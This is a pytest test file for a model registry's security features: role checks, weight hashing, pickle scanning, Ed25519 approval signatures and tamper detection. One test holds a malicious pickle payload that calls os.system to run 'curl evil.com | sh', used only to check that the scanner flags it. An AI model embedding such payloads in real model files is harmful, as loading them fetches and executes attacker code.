"""
Phase 4 — Model Integrity, Security Scanning, and Ed25519 Cryptographic Signing Tests.
Verifies:
- Authorized model catalog creation and role enforcement
- Secure model weights upload and SHA-256 calculation
- Static security scan on clean models (PASSED)
- Static security scan detecting malicious pickle / executable opcodes (FLAGGED)
- Rejection of approval for FLAGGED models
- Reviewer approval workflow generating valid Ed25519 digital signature
- On-demand verification detecting modified / tampered model files on disk
"""
import io
from pathlib import Path
import pytest
from httpx import AsyncClient
from app.security.ed25519 import verify_model_metadata
from app.utils.storage import UPLOAD_BASE_DIR


@pytest.fixture
async def model_contrib_token(client: AsyncClient) -> str:
    """Register and login a MODEL_CONTRIBUTOR."""
    await client.post(
        "/api/auth/register",
        json={
            "username": "modelcontrib1",
            "email": "modelcontrib1@example.com",
            "password": "ModelContribPass1",
            "role": "MODEL_CONTRIBUTOR",
        },
    )
    res = await client.post(
        "/api/auth/login",
        json={"username": "modelcontrib1", "password": "ModelContribPass1"},
    )
    return res.json()["access_token"]


@pytest.fixture
async def reviewer_token(client: AsyncClient) -> str:
    """Register and login a REVIEWER."""
    await client.post(
        "/api/auth/register",
        json={
            "username": "model_reviewer",
            "email": "model_reviewer@example.com",
            "password": "ReviewerPass1",
            "role": "REVIEWER",
        },
    )
    res = await client.post(
        "/api/auth/login",
        json={"username": "model_reviewer", "password": "ReviewerPass1"},
    )
    return res.json()["access_token"]


@pytest.fixture
async def inference_token(client: AsyncClient) -> str:
    """Register and login an INFERENCE_USER."""
    await client.post(
        "/api/auth/register",
        json={
            "username": "infer_user_m",
            "email": "infer_user_m@example.com",
            "password": "InferPass1",
            "role": "INFERENCE_USER",
        },
    )
    res = await client.post(
        "/api/auth/login",
        json={"username": "infer_user_m", "password": "InferPass1"},
    )
    return res.json()["access_token"]


@pytest.mark.asyncio
class TestModelRegistry:
    async def test_create_model_authorized(self, client: AsyncClient, model_contrib_token: str):
        """MODEL_CONTRIBUTOR can create a model catalog entry."""
        res = await client.post(
            "/api/models",
            headers={"Authorization": f"Bearer {model_contrib_token}"},
            json={
                "name": "YOLOv8 Urban Surveillance",
                "description": "Trained on high-resolution intersection cameras",
                "framework": "YOLOv8",
                "model_type": "object_detection",
            },
        )
        assert res.status_code == 201
        data = res.json()
        assert data["name"] == "YOLOv8 Urban Surveillance"
        assert data["owner_username"] == "modelcontrib1"
        assert "id" in data

    async def test_create_model_unauthorized_role(self, client: AsyncClient, inference_token: str):
        """INFERENCE_USER cannot create model catalog entries (403 Forbidden)."""
        res = await client.post(
            "/api/models",
            headers={"Authorization": f"Bearer {inference_token}"},
            json={"name": "Unauthorized Model"},
        )
        assert res.status_code == 403

    async def test_upload_clean_model_and_static_scan(
        self, client: AsyncClient, model_contrib_token: str
    ):
        """Upload valid model file, verify SHA-256 calculation and PASSED scan status."""
        c_res = await client.post(
            "/api/models",
            headers={"Authorization": f"Bearer {model_contrib_token}"},
            json={"name": "YOLOv8 Clean Model", "framework": "YOLOv8"},
        )
        model_id = c_res.json()["id"]

        # Clean PyTorch zip container weights dummy
        clean_bytes = b"PK\x03\x04torch_clean_model_weights_tensor_data"
        files = {"file": ("yolov8n.pt", io.BytesIO(clean_bytes), "application/octet-stream")}
        data = {"version_tag": "v1.0", "associated_dataset_version": "traffic-v1.0"}

        up_res = await client.post(
            f"/api/models/{model_id}/versions",
            headers={"Authorization": f"Bearer {model_contrib_token}"},
            data=data,
            files=files,
        )
        assert up_res.status_code == 201
        mv = up_res.json()
        assert mv["version_tag"] == "v1.0"
        assert mv["security_scan_status"] == "PASSED"
        assert mv["approval_status"] == "PENDING"
        assert len(mv["sha256_hash"]) == 64

    async def test_security_scan_detects_unsafe_pickle_payload(
        self, client: AsyncClient, model_contrib_token: str
    ):
        """
        SECURITY SCAN TEST:
        Upload model containing dangerous RCE opcode (os.system injection).
        Confirm scanner flags file as FLAGGED.
        """
        c_res = await client.post(
            "/api/models",
            headers={"Authorization": f"Bearer {model_contrib_token}"},
            json={"name": "Malicious Pickle Model", "framework": "PyTorch"},
        )
        model_id = c_res.json()["id"]

        # Injected dangerous os.system import payload
        malicious_bytes = b"cos.system\n(S'curl evil.com | sh'\ntR."
        files = {"file": ("malicious_weights.pt", io.BytesIO(malicious_bytes), "application/octet-stream")}
        data = {"version_tag": "v1.0"}

        up_res = await client.post(
            f"/api/models/{model_id}/versions",
            headers={"Authorization": f"Bearer {model_contrib_token}"},
            data=data,
            files=files,
        )
        assert up_res.status_code == 201
        mv = up_res.json()
        assert mv["security_scan_status"] == "FLAGGED"

        # Check scan record detail
        detail_res = await client.get(
            f"/api/models/{model_id}",
            headers={"Authorization": f"Bearer {model_contrib_token}"},
        )
        detail = detail_res.json()
        scan = detail["versions"][0]["scans"][0]
        assert scan["scan_result"] == "FLAGGED"
        assert "dangerous" in scan["findings_json"].lower()

    async def test_cannot_approve_flagged_model(
        self, client: AsyncClient, model_contrib_token: str, reviewer_token: str
    ):
        """Reviewer cannot approve a FLAGGED model (400 Bad Request)."""
        c_res = await client.post(
            "/api/models",
            headers={"Authorization": f"Bearer {model_contrib_token}"},
            json={"name": "Flagged Target Model"},
        )
        model_id = c_res.json()["id"]

        malicious_bytes = b"cos.system\n(S'id'\ntR."
        up_res = await client.post(
            f"/api/models/{model_id}/versions",
            headers={"Authorization": f"Bearer {model_contrib_token}"},
            data={"version_tag": "v1.0"},
            files={"file": ("flagged.pt", io.BytesIO(malicious_bytes), "application/octet-stream")},
        )
        version_id = up_res.json()["id"]

        # Attempt to approve
        app_res = await client.post(
            f"/api/models/{model_id}/versions/{version_id}/approve",
            headers={"Authorization": f"Bearer {reviewer_token}"},
        )
        assert app_res.status_code == 400
        assert "PASSED" in app_res.json()["detail"]

    async def test_approve_model_generates_valid_ed25519_signature(
        self, client: AsyncClient, model_contrib_token: str, reviewer_token: str
    ):
        """Reviewer approval generates an Ed25519 signature verified with the public key."""
        c_res = await client.post(
            "/api/models",
            headers={"Authorization": f"Bearer {model_contrib_token}"},
            json={"name": "Approved YOLOv8 Model"},
        )
        model_id = c_res.json()["id"]

        clean_bytes = b"PK\x03\x04torch_safe_production_weights_v2"
        up_res = await client.post(
            f"/api/models/{model_id}/versions",
            headers={"Authorization": f"Bearer {model_contrib_token}"},
            data={"version_tag": "v2.0", "associated_dataset_version": "v1.0"},
            files={"file": ("yolov8_v2.pt", io.BytesIO(clean_bytes), "application/octet-stream")},
        )
        version_id = up_res.json()["id"]

        # Approve
        app_res = await client.post(
            f"/api/models/{model_id}/versions/{version_id}/approve",
            headers={"Authorization": f"Bearer {reviewer_token}"},
        )
        assert app_res.status_code == 200
        approved = app_res.json()
        assert approved["approval_status"] == "APPROVED"
        assert approved["ed25519_signature"] is not None
        assert approved["ed25519_public_key"] is not None

        # Cryptographically verify the Ed25519 signature
        is_valid = verify_model_metadata(
            public_key_hex=approved["ed25519_public_key"],
            model_id=model_id,
            version_tag="v2.0",
            model_hash=approved["sha256_hash"],
            associated_dataset_version="v1.0",
            approval_status="APPROVED",
            signature_hex=approved["ed25519_signature"],
        )
        assert is_valid is True

    async def test_controlled_tampered_model_file_detection(
        self, client: AsyncClient, model_contrib_token: str, reviewer_token: str
    ):
        """
        CONTROLLED MODEL TAMPER TEST:
        1. Upload clean model and approve with Ed25519 signature.
        2. Intentionally modify physical model file bytes on disk.
        3. Call /verify endpoint.
        4. Confirm file_hash_match is False and deployment_eligible is False.
        """
        c_res = await client.post(
            "/api/models",
            headers={"Authorization": f"Bearer {model_contrib_token}"},
            json={"name": "Tamper Target Model"},
        )
        model_id = c_res.json()["id"]

        orig_bytes = b"PK\x03\x04torch_original_model_weights"
        up_res = await client.post(
            f"/api/models/{model_id}/versions",
            headers={"Authorization": f"Bearer {model_contrib_token}"},
            data={"version_tag": "v1.0"},
            files={"file": ("target.pt", io.BytesIO(orig_bytes), "application/octet-stream")},
        )
        version_id = up_res.json()["id"]
        storage_name = up_res.json()["storage_name"]

        # Approve
        await client.post(
            f"/api/models/{model_id}/versions/{version_id}/approve",
            headers={"Authorization": f"Bearer {reviewer_token}"},
        )

        # Verify before tampering: must be eligible
        v_before = await client.post(
            f"/api/models/{model_id}/versions/{version_id}/verify",
            headers={"Authorization": f"Bearer {reviewer_token}"},
        )
        assert v_before.json()["deployment_eligible"] is True
        assert v_before.json()["file_hash_match"] is True

        # INTENTIONALLY MODIFY MODEL BYTES ON DISK
        disk_path = UPLOAD_BASE_DIR / "models" / model_id / storage_name
        with open(disk_path, "wb") as f:
            f.write(b"PK\x03\x04MODIFIED_AND_TAMPERED_WEIGHTS_PAYLOAD")

        # Verify after tampering: must detect modification!
        v_after = await client.post(
            f"/api/models/{model_id}/versions/{version_id}/verify",
            headers={"Authorization": f"Bearer {reviewer_token}"},
        )
        after_data = v_after.json()
        assert after_data["file_hash_match"] is False
        assert after_data["deployment_eligible"] is False
        assert after_data["expected_hash"] != after_data["current_hash"]
        assert "tampered" in after_data["message"].lower()
